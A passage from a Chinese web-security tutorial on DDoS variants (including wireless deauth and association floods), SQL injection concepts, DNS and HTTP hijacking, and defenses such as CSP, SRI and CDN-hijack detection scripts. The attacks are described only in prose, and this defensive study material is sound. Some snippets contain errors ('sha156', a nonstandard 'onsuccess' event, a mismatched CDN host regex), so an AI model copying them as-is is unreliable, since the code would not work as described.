攻击者会在海量访问的网页中嵌入指向攻击目标网站的恶意 JavaScript 代码，当互联网用户访问该网页时，则流量被指向攻击目标网站。比较典型攻击事件：GitHub DDoS 攻击。

**ReDoS 攻击**

ReDoS (Regular expression Denial of Service)， 中文译作正则表达式拒绝服务攻击。开发人员使用了正则表达式来对用户输入的数据进行有效性校验，当编写校验的正则表达式存在缺陷或者不严谨时，攻击者可以构造特殊的字符串来大量消耗服务器的系统资源，从而造成服务器的服务中断或停止。 更详细介绍可参考：「浅析 ReDoS 的原理与实践」一文。

**DNS Query Flood**

DNS 作为互联网的核心服务之一，自然也是 DDoS 攻击的一大主要目标。DNS Query Flood 采用的方法是操纵大量傀儡机器，向目标服务器发送大量的域名解析请求。服务器在接收到域名解析请求时，首先会在服务器上查找是否有对应的缓存，若查找不到且该域名无法直接解析时，便向其上层 DNS 服务器递归查询域名信息。

通常，攻击者请求解析的域名是随机生成或者是网络上根本不存在的域名。由于在本地域名服务器无法查到对应的结果，本地域名服务器必须使用递归查询向上层域名服务器提交解析请求，引起连锁反应。解析过程给本地域名服务器带来一定的负载，每秒钟域名解析请求超过一定的数量就会造成域名服务器解析域名超时。

根据微软的统计数据，一台 DNS 服务器所能承受的动态域名查询的上限是每秒钟 9000 个请求。而一台 P3 的 PC 机上可以轻易地构造出每秒钟几万个域名解析请求，足以使一台硬件配置极高的 DNS 服务器瘫痪，由此可见 DNS 服务器的脆弱性。

##### 3.5.2.3 无线 DDoS 攻击

**Auth Flood 攻击**

Auth Flood 攻击，即身份验证洪水攻击。该攻击目标主要针对那些处于通过验证和 AP 建立关联的关联客户端，攻击者将向 AP 发送大量伪造的身份验证请求帧（伪造的身份验证服务和状态代码），当收到大量伪造的身份验证请求超过所能承受的能力时，AP 将断开其他无线服务连接。

**Deauth Flood 攻击**

Deauth Flood 攻击即为取消验证洪水攻击，它旨在通过欺骗从 AP 到客户端单播地址的取消身份验证帧来将客户端转为未关联 / 未认证的状态。对于目前的工具来说，这种形式的攻击在打断客户无线服务方面非常有效和快捷。一般来说，在攻击者发送另一个取消身份验证帧之前，客户端会重新关联和认证以再次获取服务。攻击者反复欺骗取消身份验证帧就能使所有客户端持续拒绝服务。

**Association Flood 攻击**

Association Flood 攻击即为关联洪水攻击。在无线路由器或者接入点内置一个列表即为连接状态表，里面可显示出所有与该 AP 建立连接的无线客户端状态。它试图通过利用大量模仿和伪造的无线客户端关联来填充 AP 的客户端关联表，从而达到淹没 AP 的目的。

由于开放身份验证（空身份验证）允许任何客户端通过身份验证后关联。利用这种漏洞的攻击者可以通过创建多个到达已连接或已关联的客户端来模仿很多客户端，从而淹没目标 AP 的客户端关联表。

**Disassociation Flood 攻击**

Disassociation Flood 攻击即为取消关联洪水攻击，和 Deauth Flood 攻击表现方式很相似。它通过欺骗从 AP 到客户端的取消关联帧来强制客户端成为未关联 / 未认证的状态。一般来说，在攻击者发送另一个取消关联帧之前，客户端会重新关联以再次获取服务。攻击者反复欺骗取消关联帧就能使客户端持续拒绝服务。

Disassociation Broadcast 攻击和 Disassociation Flood 攻击原理基本一致，只是在发送程度及使用工具上有所区别。前者很多时候用于配合进行无线中间人攻击，而后者常用于目标确定的点对点无线 DoS，比如：破坏或干扰指定机构或部门的无线接入点等。

**RF Jamming 攻击**

RF Jamming 攻击即为 RF 干扰攻击。该攻击是通过发出干扰射频达到破坏正常无线通信的目的。而前面几种攻击主要是基于无线通信过程及协议的。RF 为射频，主要包括无线信号发射机及收信机等。

#### 3.5.3 判断方法

**SYN 类**

1. 服务器 CPU 占用率很高。
2. 出现大量的 SYN_RECEIVED 的网络连接状态。
3. 网络恢复后，服务器负载瞬时变高。网络断开后瞬时负载下将。

**UDP 类**

1. 服务器 CPU 占用率很高。
2. 网卡每秒接受大量的数据包。
3. 网络 TCP 状态信息正常。

**CC 类**

1. 服务器 CPU 占用率很高。
2. Web 服务器出现类似 Service Unavailable 提示。
3. 出现大量的 ESTABLISHED 的网络连接状态且单个 IP 高达几十个甚至上百个连接。
4. 用户无法正常访问网站页面或打开过程非常缓慢，软重启后短期内恢复正常，几分钟后又无法访问。

#### 3.5.4 防御策略

##### 3.5.4.1 网络层 DDoS 防御

1. 限制单 IP 请求频率。
2. 网络架构上做好优化，采用负载均衡分流。
3. 防火墙等安全设备上设置禁止 ICMP 包等。
4. 通过 DDoS 硬件防火墙的数据包规则过滤、数据流指纹检测过滤、及数据包内容定制过滤等技术对异常流量进行清洗过滤。
5. 采用 ISP 近源清洗，使用电信运营商提供的近源清洗和流量压制，避免全站服务对所有用户彻底无法访问。这是对超过自身带宽储备和自身 DDoS 防御能力之外超大流量的补充性缓解措施。

##### 3.5.4.2 应用层 DDoS 防御

1. 优化操作系统的 TCP / IP 栈。
2. 应用服务器严格限制单个 IP 允许的连接数和 CPU 使用时间。
3. 编写代码时，尽量实现优化并合理使用缓存技术。尽量让网站静态化，减少不必要的动态查询。网站静态化不仅能大大提高抗攻击能力，而且还给骇客入侵带来不少麻烦，至少到现在为止关于 HTML 的溢出还没出现。
4. 增加 WAF（Web Application Firewall）设备，WAF 的中文名称叫做 Web 应用防火墙。Web 应用防火墙是通过执行一系列针对 HTTP / HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。
5. 使用 CDN / 云清洗，在攻击发生时，进行云清洗。通常云清洗厂商策略有以下几步：预先设置好网站的 CNAME，将域名指向云清洗厂商的 DNS 服务器；在一般情况下，云清洗厂商的 DNS 仍将穿透 CDN 的回源的请求指向源站，在检测到攻击发生时，域名指向自己的清洗集群，然后再将清洗后的流量回源。
6. CDN 仅对 Web 类服务有效，针对游戏类 TCP 直连的服务无效。这时可以使用 DNS 引流 + ADS (Anti-DDoS System) 设备来清洗，还有在客户端和服务端通信协议做处理（如：封包加标签，依赖信息对称等）。

DDoS 攻击究其本质其实是无法彻底防御的，我们能做得就是不断优化自身的网络和服务架构，来提高对 DDoS 的防御能力。

### 3.6 SQL注入

SQL 注入，也称为 SQL 隐码或 SQL 注码，是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入 SQL 指令，在设计不良的程序单中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的 SQL 指令而运行，因此遭到破坏或是入侵。

#### 3.6.1 攻击方式

1. SQL 命令可查询、插入、更新、删除等，命令的串接。而以分号字符为不同命令的区别。（原本的作用是用于 SubQuery 或作为查询、插入、更新、删除等的条件式）
2. SQL 命令对于传入的字符串参数是用单引号字符所包起来。（但连续 2 个单引号字符，在 SQL 数据库中，则视为字符串中的一个单引号字符）
3. SQL 命令中，可以注入注解（连续 2 个减号字符 `--` 后的文字为注解，或 `/*` 与 `*/` 所包起来的文字为注解）
4. 因此，如果在组合 SQL 的命令字符串时，未针对单引号字符作跳脱处理的话，将导致该字符变量在填入命令字符串时，被恶意窜改原本的 SQL 语法的作用。

#### 3.6.2 防御策略

##### 3.6.2.1 数据校验

SQL 注入漏洞的主要原因还是没有对用户输入的数据进行过滤，**所以对来自用户的数据（GET、POST、Cookie 等）最好做到以下两种过滤校验**：

- 检查输入的数据是否具有所期望的数据格式。这种在参数是数字的时候特别有效，如果攻击者选择在参数中插入内容的话则会被转换成 `NaN` 导致攻击失败。
- 使用数据库特定的敏感字符转义函数把用户提交上来的非数字数据进行转义。

##### 3.6.2.2 权限限制

严格限制 Web 应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害。**请记住永远不要使用超级用户或所有者帐号去连接数据库！**当数据库被攻击时将损伤限制在当前表的范围是比较明智的选择。通过权限限制可以防止攻击者获取数据库其它信息，甚至利用数据库执行 Shell 命令等操作。

##### 3.6.2.3日志处理

当数据库操作失败的时候，尽量**不要将原始错误日志返回**，比如类型错误、字段不匹配等，把代码里的 SQL 语句暴露出来，以防止攻击者利用这些错误信息进行 SQL 注入。除此之外，在允许的情况下，**使用代码或数据库系统保存查询日志**也是一个好办法。显然，日志并不能防止任何攻击，但定期审计数据库执行日志可以跟踪是否存在应用程序正常逻辑之外的 SQL 语句执行。日志本身没用，要查阅其中包含的信息才行。毕竟，更多的信息总比没有要好。

### 3.7 流量劫持

流量劫持的方式主要分为两种：

- 域名解析劫持（DNS 劫持）
- 数据劫持（HTTP 劫持）

我们国内用户，一般是在家用路由器后面，要访问一个网站的话，会有三个步骤：

1. 首先访问 DNS 服务器，将域名转换为 IP 地址。
2. 访问这个 IP 地址，这样用户就访问了目标网站。
3. 如果是一个建设良好的网站，一般会把静态资源放在 CDN 上。

流量劫持就是在这些环节当中，对数据进行 **偷窃**、**篡改**，甚至转发流量进行攻击的这样一类行为。

#### 3.7.1 DNS 劫持

**域名解析劫持**（DNS 劫持）是针对传统 DNS 解析的常见劫持方式。用户在浏览器输入网址，即发出一个 HTTP 请求，首先需要进行域名解析，得到业务服务器的 IP 地址。使用传统 DNS 解析时，会通过当地网络运营商提供的本地域名服务器解析得到结果。在请求本地域名服务器解析域名时会出现问题，目标域名被恶意地解析到其他 IP 地址，造成用户无法正常使用服务。

##### 3.7.1.1 攻击方式

那么如何才能够污染 DNS 以达成流量劫持的目的呢？粗略来说，一共有三种途径：

1. **在用户设备上动手**：这个主要是通过一些恶意软件实现的，比如早期一些流氓软件会在用户本机篡改 `hosts` 文件，影响用户的搜索引擎工作。
2. **污染中间链路设备**：由于 DNS 查询是基于 UDP 协议明文发送的，因此在任意中间设备上，比如路由器，进行中间人攻击，修改 UDP 包的内容，就可以影响 DNS 的结果了。
3. **入侵 DNS 服务器**：这是一种成本比较高的方案，看起来似乎很困难，但 DNS 是一种相对古老的技术，其服务软件的实现可能已经年久失修，别有用心的攻击者可以寻找一些缺乏维护的 DNS 服务器，施行攻击。另外，有时 DNS 服务器上不止运行 DNS 软件，还会有一些其他的软件也在运行，比如同时也启动了 HTTP 服务等，这时攻击者也可以通过这些软件的漏洞来控制服务器，进而影响 DNS 的解析。由于 DNS 的缓存和上下传递关系，一旦有 DNS 服务器被影响，就会一次影响很多用户的访问，因此非常危险。

这三种途径当中，第一种和第三种的实施成本都比较高，但污染链路设备，在 Wi-Fi 普及而安全意识尚未普及的今天，是最容易得手的一种途径。

##### 3.7.1.2 防御策略

目前针对 DNS 投毒，对抗中间人攻击的研究比较多。DNS 协议本身的安全性较差，而改造 DNS 协议又比较困难，因此现在主要的防御手段，集中在替换 UDP 协议上。

- TLS（Cloudflare）
- HTTP（腾讯云、阿里云）
- HTTPS（Cloudflare、Google）

目前，三种常见的替代方式比较流行：

1. DNS over TLS。这种协议是在 TLS 协议之上传输 DNS 内容，有点类似 HTTPS 和 TLS 关系。
2. DNS over HTTP。用 HTTP 协议来传输 DNS ，也是可以的。国内厂商当中对这种方案的支持较多。最简单的实现是使用一个 固定的 IP 地址作为域名服务器，每次不发生 UDP ，而是向这台服务器发送 HTTP 请求来获取解析结果。但通常很难签发相应的证书给固定 IP，因此也有些厂商自己对 HTTP 报文进行加密，从而防止这些解析结果再被中间人篡改。
3. DNS over HTTPS。和第二点比较类似，区别是使用了 HTTPS 协议。根据我的观察，采用这种方案的 Google 和 Cloudflare 都使用的是域名而非固定 IP ，因此还是要先解析一次域名服务器自身的域名才可以进行真正的查询。这可能会导致再次被中间人扰乱，从而迫使用户降级到普通的 UDP 方式上。

比较遗憾的是，由于浏览器没有暴露 DNS 相关的接口，这三种较为安全的 DNS 查询方式，都无法在前端当中得以使用。而 iOS 和 Android 开发者有机会使用其中的技术进行加强，但需要单独编写一些代码。

#### 3.7.2 HTTP 劫持

HTTP 协议属于明文协议，中间链路上的任意设备，都可以篡改内容，导致流量劫持。

##### 3.7.2.1 防御策略

**Content Security Policy**

CSP 原本是为了和 XSS 对抗而产生的一种技术方案，其原理是在 HTML 加载的时候，指定每种资源的 URL 白名单规则，防止 XSS 的运行和数据外送。但如果巧妙利用规则，也可以让所有的资源强制走 HTTPS ，这样就可以降低流量劫持的可能性。

具体的 CSP 规则比较复杂，大家可以在 [CSP 专属网站](https://content-security-policy.com/)上自己查看。

**Subresource Integrity**

SRI 是专门用来校验资源的一种方案，它读取资源标签中的 `integrity` 属性，将其中的信息摘要值，和资源实际的信息摘要值进行对比，如果发现无法匹配，那么浏览器就会拒绝执行资源。对于 `<script>` 标签来说，就是拒绝执行其中的代码，对于 CSS 来说则是不加载其中的样式。

通过给 `link` 标签或者 `script` 标签增加 `integrity` 属性即可开启 SRI 功能，比如：

```html
<script
  type="text/javascript"
  src="//s.url.cn/xxx/aaa.js"
  integrity="sha156-xxx sha384-yyy"
  crossorigin="anonymous"
></script>
```

`integrity` 值分成两个部分，第一部分指定哈希值的生成算法（sha256、sha384 及 sha512），第二部分是经过 `base64` 编码的实际哈希值，两者之间通过一个短横（`-`）分割。`integrity` 值可以包含多个由空格分隔的哈希值，只要文件匹配其中任意一个哈希值，就可以通过校验并加载该资源。上述例子中我使用了 `sha256` 和 `sha384` 两种 `hash` 方案。

> 备注：crossorigin="anonymous" 的作用是引入跨域脚本，在 HTML5 中有一种方式可以获取到跨域脚本的错误信息，首先跨域脚本的服务器必须通过 Access-Controll-Allow-Origin 头信息允许当前域名可以获取错误信息，然后是当前域名的 `script` 标签也必须声明支持跨域，也就是 `crossorigin` 属性。`link`、`img` 等标签均支持跨域脚本。如果上述两个条件无法满足的话， 可以使用 `try catch` 方案。

通过使用 webpack 的 `html-webpack-plugin` 和 `webpack-subresource-integrity` 可以生成包含 `integrity` 属性 `script` 标签。

```js
import SriPlugin from 'webpack-subresource-integrity';
const compiler = webpack({  output: {    crossOriginLoading: 'anonymous',  },  plugins: [    new SriPlugin({      hashFuncNames: ['sha256', 'sha384'],      enabled: process.env.NODE_ENV === 'production',    }),  ],});
```

那么当 `script` 或者 `link` 资源 SRI 校验失败的时候应该怎么做呢？

比较好的方式是通过 `script` 的 `onerror` 事件，当遇到 `onerror` 的时候重新 `load` 静态文件服务器之间的资源：

```html
<script
  type="text/javascript"
  src="//11.url.cn/aaa.js"
  integrity="sha256-xxx sha384-yyy"
  crossorigin="anonymous"
  onerror="loadScriptError.call(this, event)"
  onsuccess="loadScriptSuccess"
></script>
```

在此之前注入以下代码：

```js
(function () {
	function loadScriptError (event) {
		// 上报
		...
		// 重新加载 js
		return new Promise(function (resolve, reject) {
			var script = document.createElement('script')
			script.src = this.src.replace(/\/\/11.src.cn/, 'https://x.y.z') // 替换 cdn 地址为静态文件服务器地址
			script.onload = resolve
			script.onerror = reject
			script.crossOrigin = 'anonymous'
			document.getElementsByTagName('head')[0].appendChild(script)
		})
	}
	function loadScriptSuccess () {
		// 上报
		...
	}
	window.loadScriptError = loadScriptError
	window.loadScriptSuccess = loadScriptSuccess
})()
```

比较痛苦的是 `onerror` 中的 `event` 中无法区分究竟是什么原因导致的错误，可能是资源不存在，也可能是 SRI 校验失败，当然出现最多的还是请求超时，不过目前来看，除非有统计需求，无差别对待并没有多大问题。

注入 `onerror` 事件

当然，由于项目中的 `script` 标签是由 webpack 打包进去的，所以我们要使用 `script-ext-html-webpack-plugin` 将 `onerror` 事件和 `onsuccess` 事件注入进去：

```js
const ScriptExtHtmlWebpackPlugin = require('script-ext-html-webpack-plugin');
module.exports = {  //...  plugins: [    new HtmlWebpackPlugin(),    new SriPlugin({      hashFuncNames: ['sha256', 'sha384'],    }),    new ScriptExtHtmlWebpackPlugin({      custom: {        test: /\/*_[A-Za-z0-9]{8}.js/,        attribute: 'onerror',        value: 'loadScriptError.call(this, event)',      },    }),    new ScriptExtHtmlWebpackPlugin({      custom: {        test: /\/*_[A-Za-z0-9]{8}.js/,        attribute: 'onsuccess',        value: 'loadScriptSuccess.call(this, event)',      },    }),  ],};
```

然后将 `loadScriptError` 和 `loadScriptSuccess` 两个方法注入到 HTML 中，可以使用 `inline` 的方式。

#### 3.7.3 CDN 劫持

前面说到 script 加载失败可能是由于多种原因造成的，那如何是否判断发生了 CDN 劫持呢？

方法就是再请求一次数据，比较两次得到文件的内容（当然不必全部比较），如果内容不一致，就可以得出结论了。

```js
function loadScript(url) {
  return fetch(url)
    .then((res) => {
      if (res.ok) {
        return res;
      }
      return Promise.reject(new Error());
    })
    .then((res) => {
      return res.text();
    })
    .catch((e) => {
      return '';
    });
}
```

比较两次加载的 `script` 是否相同

```js
function checkScriptDiff(src, srcNew) {
  return Promise.all([loadScript(src), loadScript(srcNew)])
    .then((data) => {
      var res1 = data[0].slice(0, 1000);
      var res2 = data[1].slice(0, 1000);
      if (!!res1 && !!res2 && res1 !== res2) {
        // CDN劫持事件发生
      }
    })
    .catch((e) => {
      // ...
    });
}
```

这里为什么只比较前 1000 个字符？因为通常 CDN 劫持者会在 js 文件最前面注入一些代码来达到他们的目的，注入中间代码需要 AST 解析，成本较高，所以比较全部字符串没有意义。如果你还是有顾虑的话，可以加上后 n 个字符的比较。